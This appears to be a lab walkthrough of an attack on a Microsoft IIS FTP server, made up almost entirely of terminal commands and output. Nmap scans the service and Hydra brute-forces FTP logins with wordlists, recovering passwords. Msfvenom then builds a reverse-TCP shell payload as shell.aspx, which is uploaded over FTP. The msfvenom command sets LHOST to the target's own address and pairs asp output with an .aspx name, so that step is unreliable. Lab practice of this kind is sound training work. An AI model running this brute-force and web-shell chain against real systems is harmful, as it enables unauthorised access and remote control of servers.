# Targeting Microsoft IIS FTP

```sh
msf6 > ls -al /usr/share/nmap/scripts/ | grep ftp-
[*] exec: ls -al /usr/share/nmap/scripts/ | grep ftp-

-rw-r--r-- 1 root root  4530 Oct 26  2021 ftp-anon.nse
-rw-r--r-- 1 root root  3253 Oct 26  2021 ftp-bounce.nse
-rw-r--r-- 1 root root  3108 Oct 26  2021 ftp-brute.nse
-rw-r--r-- 1 root root  3272 Oct 26  2021 ftp-libopie.nse
-rw-r--r-- 1 root root  3290 Oct 26  2021 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root  3768 Oct 26  2021 ftp-syst.nse
-rw-r--r-- 1 root root  6021 Oct 26  2021 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root  5923 Oct 26  2021 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root  5736 Oct 26  2021 tftp-enum.nse
msf6 > db_nmap -sV -p 21 --script=ftp-anon 10.5.18.187
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-14 16:51 IST
[*] Nmap: Nmap scan report for demo.ine.local (10.5.18.187)
[*] Nmap: Host is up (0.0025s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 21/tcp open  ftp     Microsoft ftpd
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
msf6 > 
```

```sh
msf6 > ftp 10.5.18.187 21
[*] exec: ftp 10.5.18.187 21

Connected to 10.5.18.187.
220 Microsoft FTP Service
Name (10.5.18.187:root): anonymous
331 Password required for anonymous.
Password: 
530 User cannot log in.
ftp: Login failed
ftp> 
```

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.5.18.187 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-14 16:54:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 169512 login tries (l:168/p:1009), ~10595 tries per task
[DATA] attacking ftp://10.5.18.187:21/
[STATUS] 4625.00 tries/min, 4625 tries in 00:01h, 164887 to do in 00:36h, 16 active
<strong>[21][ftp] host: 10.5.18.187   login: administrator   password: vagrant
</strong>[STATUS] 4659.00 tries/min, 13977 tries in 00:03h, 155535 to do in 00:34h, 16 active
[STATUS] 4668.43 tries/min, 32679 tries in 00:07h, 136833 to do in 00:30h, 16 active
[STATUS] 4671.20 tries/min, 70068 tries in 00:15h, 99444 to do in 00:22h, 16 active
[STATUS] 4671.85 tries/min, 93437 tries in 00:20h, 76075 to do in 00:17h, 16 active
[STATUS] 4671.96 tries/min, 116799 tries in 00:25h, 52713 to do in 00:12h, 16 active
[STATUS] 4672.40 tries/min, 140172 tries in 00:30h, 29340 to do in 00:07h, 16 active

^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
root@attackdefense:~# hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.5.18.187 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-14 17:27:41
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ftp://10.5.18.187:21/
<strong>[21][ftp] host: 10.5.18.187   login: vagrant   password: vagrant
</strong>1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-14 17:27:54
root@attackdefense:~# 
</code></pre>

```sh
root@attackdefense:~# msfvenom -p windows/shell/reverse_tcp LHOST=10.5.18.187 LPORT=1234 -f asp > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38296 bytes



root@attackdefense:~# ftp 10.5.18.187 21
Connected to 10.5.18.187.
220 Microsoft FTP Service
Name (10.5.18.187:root): vagrant
331 Password required for vagrant.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49530|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************| 38366       13.50 MiB/s    --:-- ETA
226 Transfer complete.
38366 bytes sent in 00:00 (5.45 MiB/s)
```
